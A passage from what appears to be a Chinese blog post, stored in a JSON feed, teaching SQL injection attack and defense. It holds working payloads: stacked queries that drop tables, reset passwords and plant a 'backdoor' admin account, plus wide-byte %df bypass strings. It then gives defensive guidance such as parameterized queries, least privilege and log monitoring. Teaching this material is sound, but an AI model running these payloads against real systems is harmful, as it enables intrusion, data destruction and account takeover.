class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">insert</span> <span class=\"hljs-keyword\">into</span> users(username,<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">values</span>(<span class=\"hljs-string\">&#x27;hacker&#x27;</span>,<span class=\"hljs-string\">&#x27;123456&#x27;</span>) <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">drop</span> <span class=\"hljs-keyword\">table</span> logs <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">update</span> users <span class=\"hljs-keyword\">set</span> <span class=\"hljs-keyword\">password</span>=<span class=\"hljs-string\">&#x27;hacked&#x27;</span> <span class=\"hljs-keyword\">where</span> id=<span class=\"hljs-number\">1</span> <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">create</span> <span class=\"hljs-keyword\">user</span> hacker identified <span class=\"hljs-keyword\">by</span> <span class=\"hljs-string\">&#x27;123456&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>高级利用</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># 创建新管理员账户<br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">insert</span> <span class=\"hljs-keyword\">into</span> admin_users(username,<span class=\"hljs-keyword\">password</span>,<span class=\"hljs-keyword\">role</span>) <span class=\"hljs-keyword\">values</span>(<span class=\"hljs-string\">&#x27;backdoor&#x27;</span>,md5(<span class=\"hljs-string\">&#x27;secret&#x27;</span>),<span class=\"hljs-string\">&#x27;admin&#x27;</span>) <span class=\"hljs-comment\">--</span><br><br># 修改现有用户权限<br>?id=<span class=\"hljs-number\">1</span>; <span class=\"hljs-keyword\">update</span> users <span class=\"hljs-keyword\">set</span> <span class=\"hljs-keyword\">role</span>=<span class=\"hljs-string\">&#x27;admin&#x27;</span> <span class=\"hljs-keyword\">where</span> username=<span class=\"hljs-string\">&#x27;normaluser&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-宽字节注入（Wide-Byte-Injection）\"><a href=\"#6-宽字节注入（Wide-Byte-Injection）\" class=\"headerlink\" title=\"6. 宽字节注入（Wide Byte Injection）\"></a>6. 宽字节注入（Wide Byte Injection）</h3><p><strong>攻击原理</strong>：利用多字节字符集（如GBK、GB2312）的编码特性，使转义字符<code>\\</code>与注入字符组合成合法的多字节字符，从而绕过转义防护机制。</p>\n<p><strong>技术背景</strong>：</p>\n<ul>\n<li>GBK编码中，一个汉字占用2个字节</li>\n<li>某些字节组合会被解释为单个汉字字符</li>\n<li><code>%df%5c</code> 在GBK编码下会被解释为一个汉字</li>\n</ul>\n<p><strong>绕过原理</strong>：</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\"><span class=\"hljs-comment\"># 正常情况：单引号被转义</span><br>payload: admin<span class=\"hljs-string\">&#x27; or 1=1 --</span><br><span class=\"hljs-string\">转义后: admin\\&#x27;</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-attribute\">1</span>=1 --<br><br><span class=\"hljs-comment\"># 宽字节绕过：</span><br>payload: admin%df<span class=\"hljs-string\">&#x27; or 1=1 --</span><br><span class=\"hljs-string\">转义后: admin%df\\&#x27;</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-attribute\">1</span>=1 --<br>GBK解析: admin[汉字]<span class=\"hljs-string\">&#x27; or 1=1 --</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>实战payload</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?username=<span class=\"hljs-keyword\">admin</span>%df<span class=\"hljs-string\">&#x27; union select 1,user(),3 --</span><br><span class=\"hljs-string\">?id=1%df&#x27;</span> <span class=\"hljs-keyword\">and</span> extractvalue(<span class=\"hljs-number\">1</span>,concat(<span class=\"hljs-number\">0x7e</span>,<span class=\"hljs-keyword\">database</span>())) <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"7-二次注入（Second-order-Injection）\"><a href=\"#7-二次注入（Second-order-Injection）\" class=\"headerlink\" title=\"7. 二次注入（Second-order Injection）\"></a>7. 二次注入（Second-order Injection）</h3><p><strong>攻击原理</strong>：恶意payload在第一次请求中被正常存储到数据库，但在后续的查询中被调用时触发SQL注入。这种攻击方式具有很强的隐蔽性。</p>\n<p><strong>攻击流程</strong>：</p>\n<ol>\n<li><strong>第一阶段 - 数据存储</strong>：</li>\n</ol>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-comment\"># 用户注册时提交恶意用户名</span><br>username: admin&#x27;<span class=\"hljs-comment\">--</span><br><span class=\"hljs-comment\"># 被存储到数据库中</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>第二阶段 - 触发注入</strong>：</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"># 管理后台查询该用户信息时<br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> username <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&#x27;admin&#x27;</span><span class=\"hljs-comment\">--&#x27;</span><br># 注释符导致后续条件被忽略<br></code></pre></td></tr></table></figure>\n\n<p><strong>典型应用场景</strong>：</p>\n<ul>\n<li>用户注册&#x2F;个人信息修改</li>\n<li>文章评论系统</li>\n<li>文件上传功能的文件名处理</li>\n<li>日志记录系统</li>\n</ul>\n<h2 id=\"防护措施与最佳实践\"><a href=\"#防护措施与最佳实践\" class=\"headerlink\" title=\"防护措施与最佳实践\"></a>防护措施与最佳实践</h2><h3 id=\"开发层面防护\"><a href=\"#开发层面防护\" class=\"headerlink\" title=\"开发层面防护\"></a>开发层面防护</h3><ol>\n<li><strong>使用参数化查询&#x2F;预编译语句</strong></li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-regexp\">//</span> 错误写法<br><span class=\"hljs-variable\">$sql</span> = <span class=\"hljs-string\">&quot;SELECT * FROM users WHERE id = &quot;</span> . <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>];<br><br><span class=\"hljs-regexp\">//</span> 正确写法  <br><span class=\"hljs-variable\">$stmt</span> = <span class=\"hljs-variable\">$pdo</span>-&gt;prepare(<span class=\"hljs-string\">&quot;SELECT * FROM users WHERE id = ?&quot;</span>);<br><span class=\"hljs-variable\">$stmt</span>-&gt;execute([<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>]]);<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>严格的输入验证</strong></li>\n</ol>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">// 白名单验证</span><br><span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&#x27;/^[0-9]+$/&#x27;</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>])) &#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Invalid input&#x27;</span>);<br>&#125;<br><br><span class=\"hljs-comment\">// 长度限制</span><br><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title function_ invoke__\">strlen</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;username&#x27;</span>]) &gt; <span class=\"hljs-number\">50</span>) &#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Username too long&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>使用ORM框架</strong></li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># Django ORM - 自动参数化<br><span class=\"hljs-keyword\">User</span>.objects.<span class=\"hljs-keyword\">filter</span>(id=user_id)<br><br># SQLAlchemy - 安全查询<br><span class=\"hljs-keyword\">session</span>.query(<span class=\"hljs-keyword\">User</span>).<span class=\"hljs-keyword\">filter</span>(<span class=\"hljs-keyword\">User</span>.id == user_id)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"数据库层面防护\"><a href=\"#数据库层面防护\" class=\"headerlink\" title=\"数据库层面防护\"></a>数据库层面防护</h3><ol>\n<li><strong>最小权限原则</strong></li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"><span class=\"hljs-comment\">-- 创建专用应用账户，仅授予必要权限</span><br><span class=\"hljs-keyword\">CREATE</span> <span class=\"hljs-keyword\">USER</span> <span class=\"hljs-string\">&#x27;webapp&#x27;</span>@<span class=\"hljs-string\">&#x27;localhost&#x27;</span> IDENTIFIED <span class=\"hljs-keyword\">BY</span> <span class=\"hljs-string\">&#x27;strong_password&#x27;</span>;<br><span class=\"hljs-keyword\">GRANT</span> <span class=\"hljs-keyword\">SELECT</span>, <span class=\"hljs-keyword\">INSERT</span>, <span class=\"hljs-keyword\">UPDATE</span> <span class=\"hljs-keyword\">ON</span> webapp_db.* <span class=\"hljs-keyword\">TO</span> <span class=\"hljs-string\">&#x27;webapp&#x27;</span>@<span class=\"hljs-string\">&#x27;localhost&#x27;</span>;<br><span class=\"hljs-comment\">-- 禁止DROP, ALTER, FILE等危险权限</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>关闭错误信息显示</strong></li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">// 生产环境关闭错误显示</span><br><span class=\"hljs-built_in\">ini_set</span>(&#x27;display_errors&#x27;, <span class=\"hljs-number\">0</span>);<br><span class=\"hljs-built_in\">error_reporting</span>(<span class=\"hljs-number\">0</span>);<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>启用SQL查询日志</strong></li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-comment\">-- MySQL启用慢查询日志</span><br><span class=\"hljs-keyword\">SET</span> <span class=\"hljs-keyword\">GLOBAL</span> slow_query_log <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&#x27;ON&#x27;</span>;<br><span class=\"hljs-keyword\">SET</span> <span class=\"hljs-keyword\">GLOBAL</span> long_query_time <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">1</span>;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"WAF与监控\"><a href=\"#WAF与监控\" class=\"headerlink\" title=\"WAF与监控\"></a>WAF与监控</h3><ol>\n<li><strong>部署Web应用防火墙</strong></li>\n</ol>\n<ul>\n<li>ModSecurity规则集</li>\n<li>云WAF服务（阿里云、腾讯云等）</li>\n<li>自定义过滤规则</li>\n</ul>\n<ol>\n<li><strong>实时监控与告警</strong></li>\n</ol>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\"><span class=\"hljs-meta\"># 监控异常SQL查询</span><br>tail <span class=\"hljs-punctuation\">-</span>f /var/<span class=\"hljs-built_in\">log</span>/mysql/mysql.<span class=\"hljs-built_in\">log</span> <span class=\"hljs-string\">| grep -i &quot;</span>union\\<span class=\"hljs-string\">|sleep\\|benchmark&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>SQL注入漏洞虽然是一个”老”问题，但在实际的渗透测试和安全评估中仍然大量存在。理解各种注入类型的原理和利用方法，对于安全研究人员发现漏洞、开发人员修复漏洞都具有重要意义。</p>\n<p><strong>关键要点回顾</strong>：</p>\n<ul>\n<li>错误注入利用数据库报错获取信息</li>\n<li>联合注入通过union语句直接获取数据</li>\n<li>时间盲注和布尔盲注适用于无回显场景</li>\n<li>堆叠注入危险性最高，可执行任意SQL操作</li>\n<li>宽字节注入针对特定编码环境</li>\n<li>二次注入具有较强的隐蔽性</li>\n</ul>\n<p><strong>防护核心</strong>：</p>\n<ul>\n<li>使用参数化查询是最有效的防护手段</li>\n<li>输入验证和输出编码同样重要</li>\n<li>遵循最小权限原则配置数据库权限</li>\n<li>定期进行安全评估和代码审计</li>\n</ul>\n<p>希望本文能够帮助读者全面理解SQL注入的攻防技术，在实际工作中更好地保护Web应用程序的安全。</p>\n<hr>\n<blockquote>\n<p><strong>免责声明</strong>：本文内容仅供学习和研究使用，请勿用于非法用途。任何人使用本文信息进行违法活动，后果自负。</p>\n</blockquote>\n",
            "tags": [
                "渗透测试",
                "Web安全",
                "SQL注入",
                "网络安全"
            ]
        }
    ]
}